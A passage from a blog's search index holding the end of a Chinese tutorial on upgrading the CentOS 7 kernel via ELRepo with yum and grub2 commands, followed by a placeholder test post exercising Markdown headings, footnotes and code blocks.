<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 载入公钥</span></span><br><span class="line">sudo rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org</span><br><span class="line"><span class="comment"># 安装ELRepo</span></span><br><span class="line">sudo rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-3.el7.elrepo.noarch.rpm</span><br><span class="line"><span class="comment"># 载入elrepo-kernel元数据</span></span><br><span class="line">sudo yum --disablerepo=\* --enablerepo=elrepo-kernel repolist</span><br><span class="line"><span class="comment"># 查看可用的rpm包</span></span><br><span class="line">sudo yum --disablerepo=\* --enablerepo=elrepo-kernel list kernel*</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/centos/centos-7-kernel-upgrade/img-06.png"
                      alt="" loading="lazy"
                ><br>
<img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/centos/centos-7-kernel-upgrade/img-07.png"
                      alt="" loading="lazy"
                ></p>
<p>确认要安装的kernel，这里安装最新版本的<code>kernel-ml</code></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum --disablerepo=\* --enablerepo=elrepo-kernel install -y kernel-ml.x86_64</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/centos/centos-7-kernel-upgrade/img-08.png"
                      alt="" loading="lazy"
                ></p>
<p>重启，选择新版本内核进入系统。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/centos/centos-7-kernel-upgrade/img-09.png"
                      alt="" loading="lazy"
                ></p>
<p>此时，操作系统使用的内核已升级为<code>4.15.0-1.el7.elrepo.x86_64</code></p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/centos/centos-7-kernel-upgrade/img-10.png"
                      alt="" loading="lazy"
                ></p>
<p>最后一步，建议将内核工具包一并升级</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除旧版本工具包</span></span><br><span class="line">sudo yum remove kernel-tools-libs.x86_64 kernel-tools.x86_64</span><br><span class="line"><span class="comment"># 安装新版本工具包</span></span><br><span class="line">sudo yum --disablerepo=\* --enablerepo=elrepo-kernel install -y kernel-ml-tools.x86_64</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/centos/centos-7-kernel-upgrade/img-11.png"
                      alt="" loading="lazy"
                ></p>
<p>至此，升级完成。</p>
<h2 id="方案三：自编译升级">方案三：自编译升级</h2>
<ul>
<li>Step1: 下载源码</li>
<li>Step2: 安装gcc bc cmake</li>
<li>Step3: 编译源码，安装新内核</li>
</ul>
<p>自编译升级过程略微复杂，且不便于后期维护，具体实验步骤在此略去不表。</p>
<h2 id="话题扩展">话题扩展</h2>
<p>如何将新安装的内核设定为操作系统的默认内核，或者说如何将新版本的内核设置为重启后的默认内核？<br>
仅需两步，之后重启即可。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo grub2-set-default 0</span><br><span class="line">sudo grub2-mkconfig -o /etc/grub2.cfg</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/centos/centos-7-kernel-upgrade/img-12.png"
                      alt="" loading="lazy"
                ><br>
<img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/centos/centos-7-kernel-upgrade/img-13.png"
                      alt="" loading="lazy"
                ></p>
<h2 id="术语解析">术语解析</h2>
<ul>
<li>kernel-ml</li>
</ul>
<p>kernel-ml 中的 <code>ml</code> 是英文【mainline stable】的缩写，elrepo-kernel中罗列出来的是最新的稳定主线版本。</p>
<ul>
<li>kernel-lt</li>
</ul>
<p>kernel-lt 中的 <code>lt</code> 是英文【long term support】的缩写，elrepo-kernel中罗列出来的长期支持版本。</p>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="http://elrepo.org/tiki/tiki-index.php" >the ELRepo Project <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.kernel.org/" >kernel.org <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<hr>
<p><a class="link"   href="https://blog.csdn.net/breeze915/article/details/79243673" >https://blog.csdn.net/breeze915/article/details/79243673 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Red Hat</category>
        <category>CentOS</category>
      </categories>
      <tags>
        <tag>redhat</tag>
        <tag>centos</tag>
        <tag>kernel</tag>
        <tag>CentOS 7</tag>
        <tag>upgrade</tag>
      </tags>
  </entry>
  <entry>
    <title>My New Post</title>
    <url>/2017/my-new-post/</url>
    <content><![CDATA[<h1>H1</h1>
<h2 id="H2">H2</h2>
<h3 id="H3">H3</h3>
<h4 id="H4">H4</h4>
<h5 id="H5">H5</h5>
<h6 id="H6">H6</h6>
<p>Hello, Blog~</p>
<p><a class="link"   href="https://markdown-it.github.io/#fn3" >https://markdown-it.github.io/#fn3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://github.blog/changelog/2021-09-30-footnotes-now-supported-in-markdown-fields/" >https://github.blog/changelog/2021-09-30-footnotes-now-supported-in-markdown-fields/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>测试 footnote</p>
<p>Hello, Blog~ <sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup><sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup></p>
<p>⏰🅾<br>
Ⓜ</p>
<p>Footnote 1 link<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>.</p>
<p>Footnote 2 link<sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup>.</p>
<p>Inline footnote<sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup> definition.</p>
<p>Duplicated footnote reference<sup class="footnote-ref"><a href="#fn4" id="fnref4:1">[4:1]</a></sup>.</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">111</span><br><span class="line">111</span><br><span class="line">111</span><br><span class="line">select 1</span><br><span class="line">from 1</span><br><span class="line">where 1</span><br><span class="line">order by 1</span><br><span class="line">desc</span><br></pre></td></tr></table></figure></div>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">echo <span class="number">1</span></span><br></pre></td></tr></table></figure>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">echo 1</span><br></pre></td></tr></table></figure></div>
<p><code>aaaa</code></p>
<img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/img/tidb/tidb-t.jpg"
                      width=450px
                >
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2017/my-new-post/cover.jpeg"
                      alt="" loading="lazy"
                ></p>
<hr>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a href="http://shawnyan.cn">shawnyan.cn</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn2" class="footnote-item"><p>hello, blog~ <code>啊</code> 🌐 <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn3" class="footnote-item"><p>Footnote <strong>can have markup</strong></p>
<p>and multiple paragraphs. <a href="#fnref3" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn4" class="footnote-item"><p>Footnote text. <a href="#fnref4" class="footnote-backref">↩︎</a> <a href="#fnref4:1" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn5" class="footnote-item"><p>Text of inline footnote <a href="#fnref5" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>c1</category>
        <category>c2</category>
      </categories>
      <tags>
        <tag>t1</tag>
        <tag>t2</tag>
      </tags>
  </entry>
</search>
